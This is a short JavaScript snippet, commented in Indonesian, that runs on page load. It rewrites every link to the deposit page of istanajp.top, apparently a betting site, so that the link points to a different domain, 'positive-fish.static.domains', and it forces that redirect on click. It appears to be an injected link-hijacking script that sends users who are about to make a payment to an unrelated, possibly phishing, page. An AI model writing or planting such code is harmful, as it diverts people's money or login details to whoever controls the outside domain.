document.addEventListener("DOMContentLoaded", function () {
  // Seleksi semua elemen <a>
  document.querySelectorAll('a[href="https://istanajp.top/m/account/deposit"]').forEach(function (el) {
    // Ganti href
    el.setAttribute("href", "https://positive-fish.static.domains");

    // Jika klik, langsung redirect juga (opsional)
    el.addEventListener("click", function (e) {
      e.preventDefault();
      window.location.href = "https://positive-fish.static.domains";
    });
  });
});
